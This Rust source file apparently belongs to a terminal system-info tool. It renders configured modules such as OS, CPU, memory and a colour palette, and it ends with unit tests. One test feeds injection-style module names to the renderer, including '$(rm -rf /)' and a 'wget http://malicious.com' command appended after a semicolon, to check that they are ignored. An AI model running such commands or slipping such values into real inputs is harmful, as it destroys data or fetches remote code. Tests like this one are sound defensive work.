use crate::config::{Config, ModuleConfig};
use crate::info::Info;

const PALETTE_KEY: &str = "palette";
const HEADER_KEY: &str = "header";
const SEP_KEY: &str = "sep";
const DEFAULT_PALETTE_ICON: &str = "🎨";
pub const DEFAULT_MODULE_ICON: &str = "●";
const SEPARATOR: &str = "---";
const UNKNOWN_FALLBACK: &str = "Unknown";
const SQUARES_STYLE: &str = "squares";
const CIRCLES_STYLE: &str = "circles";
const TRIANGLES_STYLE: &str = "triangles";
const LINES_STYLE: &str = "lines";
const ANSI_COLORS: [u8; 8] = [0, 1, 2, 3, 4, 5, 6, 7];

#[derive(Debug)]
pub enum RenderNode {
    Line {
        key: String,
        value: String,
        icon: String,
    },
    Group {
        title: String,
        children: Vec<RenderNode>,
    },
}

pub fn prepare_render_tree(
    info: &Info,
    modules: &[ModuleConfig],
    config: &Config,
) -> Vec<RenderNode> {
    let mut nodes = Vec::new();
    for module in modules {
        match module {
            ModuleConfig::Simple(key) => {
                if key == PALETTE_KEY {
                    let val = format_palette(config);
                    let icon = config
                        .icons
                        .get(key)
                        .cloned()
                        .unwrap_or_else(|| DEFAULT_PALETTE_ICON.to_string());
                    nodes.push(RenderNode::Line {
                        key: key.clone(),
                        value: val,
                        icon,
                    });
                } else if key.starts_with("plugin:") {
                    if let Some(lines) = info.plugin_info.get(key) {
                        for line in lines {
                            nodes.push(RenderNode::Line {
                                key: key.clone(),
                                value: line.trim().to_string(),
                                icon: String::new(),
                            });
                        }
                    }
                } else {
                    let val = get_module_value(info, key);
                    if let Some(v) = val {
                        let icon = config
                            .icons
                            .get(key)
                            .cloned()
                            .unwrap_or_else(|| DEFAULT_MODULE_ICON.to_string());
                        nodes.push(RenderNode::Line {
                            key: key.clone(),
                            value: v,
                            icon,
                        });
                    }
                }
            }
            ModuleConfig::Group { title, modules } => {
                let children = prepare_render_tree(info, modules, config);
                if !children.is_empty() {
                    nodes.push(RenderNode::Group {
                        title: title.clone(),
                        children,
                    });
                }
            }
        }
    }
    nodes
}

fn get_module_value(info: &Info, key: &str) -> Option<String> {
    match key {
        "os" => Some(info.os.clone()),
        "kernel" => Some(info.kernel.clone()),
        "hostname" | "host" => Some(info.host_name.clone()),
        "wm" => Some(info.desktop.clone()),
        "packages" => Some(info.packages.clone()),
        key if key.starts_with("packages:") => {
            let name = key.strip_prefix("packages:")?;
            info.packages_breakdown
                .iter()
                .find(|(cmd, _)| cmd == name)
                .map(|(_, val)| val.clone())
        }
        "shell" => Some(info.shell.clone()),
        "cpu" => Some(info.cpu.clone()),
        "gpu" => {
            if info.gpu.is_empty() {
                Some(UNKNOWN_FALLBACK.to_string())
            } else {
                Some(info.gpu.join(" / "))
            }
        }
        "memory" => Some(info.memory.clone()),
        "swap" => Some(info.swap.clone()),
        "disk" => {
            if info.disks.is_empty() {
                Some(UNKNOWN_FALLBACK.to_string())
            } else {
                Some(info.disks[0].clone())
            }
        }
        "battery" => Some(info.battery.clone()),
        "uptime" => Some(info.uptime.clone()),
        "terminal" => Some(info.terminal.clone()),
        "user" => Some(info.user.clone()),
        "datetime" => Some(info.datetime.clone()),
        "local_ip" => Some(info.local_ip.clone()),
        "local_ip:v6" => Some(info.local_ip_v6.clone()),
        "public_ip" => Some(info.public_ip.clone()),
        "interfaces" => Some(info.network_interfaces.clone()),
        PALETTE_KEY => None,
        HEADER_KEY => Some(format!("{}@{}", info.user, info.host_name)),
        SEP_KEY => Some(SEPARATOR.to_string()),
        _ => None,
    }
}

fn format_palette(config: &Config) -> String {
    let style = config.palette_style.as_deref().unwrap_or(SQUARES_STYLE);
    let mut s = String::new();

    match style {
        SQUARES_STYLE => {
            for c in ANSI_COLORS {
                s.push_str(&format!("\x1b[{}m  \x1b[0m ", c + 40));
            }
        }
        CIRCLES_STYLE => {
            for c in ANSI_COLORS {
                s.push_str(&format!("\x1b[{}m●\x1b[0m ", c + 30));
            }
        }
        TRIANGLES_STYLE => {
            for c in ANSI_COLORS {
                s.push_str(&format!("\x1b[{}m▲\x1b[0m ", c + 30));
            }
        }
        LINES_STYLE => {
            for c in ANSI_COLORS {
                s.push_str(&format!("\x1b[{}m███\x1b[0m", c + 30));
            }
        }
        _ => {
            for c in ANSI_COLORS {
                s.push_str(&format!("\x1b[{}m  \x1b[0m ", c + 40));
            }
        }
    }
    s
}

//tests
#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::Config;
    use crate::info::Info;

    #[test]
    fn test_prepare_render_tree_empty() {
        let config = Config::default();
        let info = Info::with_config(&config, false).0;let modules = vec![];

        let nodes = prepare_render_tree(&info, &modules, &config);
        assert!(nodes.is_empty());
    }

    #[test]
    fn test_security_malicious_module_injection() {
        let config = Config::default();
        let info = Info::with_config(&config, false).0;

        // Cybersec: test malicious module injection
        let malicious_modules = vec![
            ModuleConfig::Simple("$(rm -rf /)".to_string()),
            ModuleConfig::Simple("eval('malware')".to_string()),
            ModuleConfig::Simple("os_name; wget http://malicious.com".to_string()),
            ModuleConfig::Simple("A".repeat(10_000)), // Test against overflows
        ];

        let nodes = prepare_render_tree(&info, &malicious_modules, &config);

        assert!(nodes.len() <= malicious_modules.len());
    }
}
